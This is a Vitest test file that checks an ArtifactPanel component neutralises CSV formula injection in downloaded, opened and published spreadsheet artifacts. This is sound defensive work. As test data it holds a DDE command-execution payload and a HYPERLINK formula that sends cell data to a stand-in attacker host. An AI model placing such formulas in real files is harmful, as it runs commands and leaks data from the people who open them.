import { describe, expect, it, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';

const DDE = "=cmd|'/c calc'!A0";
const HYPERLINK = '=HYPERLINK("http://attacker.example/steal?u="&A1)';

const { artifactContent, artifactType, artifactLanguage, getArtifact, shellOpen, writeTextFile } =
  vi.hoisted(() => {
    const content = { current: '' };
    const type = { current: 'spreadsheet' };
    const language = { current: 'csv' };
    return {
      artifactContent: content,
      artifactType: type,
      artifactLanguage: language,
      getArtifact: vi.fn(async (id: string) => ({
        id,
        title: 'Q3 report',
        artifact_type: type.current,
        content: content.current,
        metadata: { Code: { language: language.current } },
      })),
      shellOpen: vi.fn().mockResolvedValue(undefined),
      writeTextFile: vi.fn(async () => undefined),
    };
  });

vi.mock('@tauri-apps/api/path', () => ({
  appDataDir: async () => '/data',
  join: async (...parts: string[]) => parts.join('/'),
}));

vi.mock('@tauri-apps/plugin-fs', () => ({ writeTextFile, mkdir: vi.fn(async () => undefined) }));

vi.mock('@/stores/artifactStore', () => {
  const rendered = {
    id: 'art-1',
    title: 'Q3 report',
    artifact_type: 'spreadsheet',
    rendered_content: { type: 'Code', data: { code: 'x', language: 'csv' } },
    version_info: {
      current: 1,
      total: 1,
      created_at: '2026-01-01T00:00:00.000Z',
      updated_at: '2026-01-01T00:00:00.000Z',
    },
    status: 'complete',
    available_actions: [],
  };
  const summary = (id: string) => ({
    id,
    title: 'Q3 report',
    artifact_type: 'spreadsheet',
    status: 'complete',
    current_version: 1,
    version_count: 1,
    created_at: '2026-01-01T00:00:00.000Z',
    updated_at: '2026-01-01T00:00:00.000Z',
    size_bytes: 42,
    tags: [],
    pinned: false,
  });

  const state = {
    activeArtifactId: 'art-1',
    panelOpen: true,
    isStreaming: null,
    artifacts: new Map(),
    setActiveArtifact: vi.fn(),
    closePanel: vi.fn(),
    getArtifact,
    getRenderedArtifact: vi.fn().mockResolvedValue(rendered),
    deleteArtifact: vi.fn(),
    archiveArtifact: vi.fn(),
    pinArtifact: vi.fn(),
    rollbackArtifact: vi.fn(),
    getArtifactsByConversation: vi.fn().mockResolvedValue([summary('art-1'), summary('art-2')]),
    applyDiffToArtifact: vi.fn(),
    getVersionHistory: vi.fn().mockResolvedValue([]),
  };

  return {
    useArtifactStore: (selector: (s: Record<string, unknown>) => unknown) => selector(state),
  };
});

vi.mock('@tauri-apps/plugin-shell', () => ({ open: (path: string) => shellOpen(path) }));
vi.mock('@/lib/tauri-mock', () => ({ isTauri: true }));
vi.mock('sonner', () => ({ toast: { success: vi.fn(), error: vi.fn(), info: vi.fn() } }));

vi.mock('@/lib/messageArtifactPanel', () => ({
  artifactToSummary: (a: unknown) => a,
}));

vi.mock('../ArtifactRendererView', () => ({
  ArtifactRendererView: () => <div data-testid="artifact-renderer-view" />,
}));

vi.mock('../InlineArtifactEditor', () => ({
  InlineArtifactEditor: () => <div data-testid="inline-artifact-editor" />,
}));

vi.mock('../ShareArtifactDialog', () => ({ ShareArtifactDialog: () => null }));

vi.mock('../ArtifactVersionHistory', () => ({
  ArtifactVersionHistory: () => <div data-testid="artifact-version-history" />,
}));

vi.mock('react-syntax-highlighter', () => ({
  Prism: ({ children }: { children: string }) => (
    <pre data-testid="syntax-highlighter">{children}</pre>
  ),
}));

vi.mock('react-syntax-highlighter/dist/esm/styles/prism', () => ({ oneDark: {} }));

import { TooltipProvider } from '@/ui/Tooltip';
import { ArtifactPanel } from '../ArtifactPanel';

interface CapturedDownload {
  fileName: string;
  body: string;
  mime: string;
}

const captured: CapturedDownload[] = [];

function Wrapper({ children }: { children: React.ReactNode }) {
  return <TooltipProvider>{children}</TooltipProvider>;
}

beforeEach(() => {
  captured.length = 0;
  shellOpen.mockClear();
  writeTextFile.mockClear();
  artifactContent.current = `victim,${HYPERLINK}`;
  artifactType.current = 'spreadsheet';
  artifactLanguage.current = 'csv';

  const RealBlob = globalThis.Blob;
  let pending: { body: string; mime: string } | null = null;
  class RecordingBlob extends RealBlob {
    constructor(parts: BlobPart[] = [], options?: BlobPropertyBag) {
      super(parts, options);
      pending = { body: parts.map(String).join(''), mime: options?.type ?? '' };
    }
  }
  vi.stubGlobal('Blob', RecordingBlob);
  URL.createObjectURL = vi.fn(() => 'blob:desktop-artifact-test');
  URL.revokeObjectURL = vi.fn();
  vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (
    this: HTMLAnchorElement,
  ) {
    if (pending) captured.push({ fileName: this.download, ...pending });
    pending = null;
  });
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

async function clickAndCapture(label: string): Promise<CapturedDownload> {
  render(
    <Wrapper>
      <ArtifactPanel conversationId={1} />
    </Wrapper>,
  );
  fireEvent.click(await screen.findByRole('button', { name: label }));
  await waitFor(() => expect(captured.length).toBeGreaterThan(0));
  return captured[0]!;
}

describe('ArtifactPanel writes no spreadsheet formula to disk', () => {
  it('neutralizes the download of a spreadsheet artifact', async () => {
    const file = await clickAndCapture('Download artifact');

    expect(file.fileName).toBe('Q3 report.csv');
    expect(file.body).toContain("'=HYPERLINK");
    expect(file.body).not.toContain(`,${HYPERLINK}`);
    expect(file.mime).toBe('text/csv;charset=utf-8;');
  });

  it('neutralizes the file it hands to the OS spreadsheet app', async () => {
    artifactContent.current = DDE;
    const file = await clickAndCapture('Open in system app');

    expect(file.fileName).toBe('Q3 report.csv');
    expect(file.body).not.toBe(DDE);
    expect(file.body.replace(/^"/, '')).toMatch(/^'/);
    await waitFor(() => expect(shellOpen).toHaveBeenCalledWith('Q3 report.csv'));
  });

  it('neutralizes every file in Download all', async () => {
    artifactContent.current = DDE;
    render(
      <Wrapper>
        <ArtifactPanel conversationId={1} />
      </Wrapper>,
    );
    fireEvent.click(await screen.findByRole('button', { name: 'Download all artifacts' }));

    await waitFor(() => expect(captured.length).toBe(2));
    for (const file of captured) {
      expect(file.fileName).toBe('Q3 report.csv');
      expect(file.body).not.toBe(DDE);
      expect(file.body.replace(/^"/, '')).toMatch(/^'/);
    }
  });

  it('leaves a benign table byte-identical', async () => {
    artifactContent.current = 'name,score\nAlice,30\nBob,-7';
    const file = await clickAndCapture('Download artifact');

    expect(file.body).toBe('name,score\nAlice,30\nBob,-7');
  });

  it.each(['name,,city\r\nA,B\r\n1,2,3,4\r\n\r\n', ' name ; score \nAlice;30\n'])(
    'downloads %j exactly as the model wrote it',
    async (content) => {
      artifactContent.current = content;
      const file = await clickAndCapture('Download artifact');

      expect(file.body).toBe(content);
    },
  );

  it('leaves a non-spreadsheet artifact untouched', async () => {
    artifactType.current = 'document';
    artifactContent.current = '=1+1';
    const file = await clickAndCapture('Download artifact');

    expect(file.fileName).toBe('Q3 report.md');
    expect(file.body).toBe('=1+1');
    expect(file.mime).toBe('text/plain');
  });

  it('neutralizes the file the Publish menu item saves and points the user at', async () => {
    artifactType.current = 'code';
    artifactContent.current = DDE;
    render(
      <Wrapper>
        <ArtifactPanel conversationId={1} />
      </Wrapper>,
    );

    await screen.findByRole('button', { name: 'Version history' });
    const trigger = screen
      .getAllByRole('button')
      .find((b) => b.getAttribute('aria-haspopup') === 'menu');
    expect(trigger).toBeDefined();
    fireEvent.keyDown(trigger!, { key: 'Enter' });
    fireEvent.click(await screen.findByText('Publish'));

    await waitFor(() => expect(writeTextFile).toHaveBeenCalled());
    const [path, body] = writeTextFile.mock.calls.at(-1) as unknown as [string, string];
    expect(path).toBe('/data/artifacts/Q3_report-art-1.csv');
    expect(body).toBe(`'${DDE}`);
  });
});
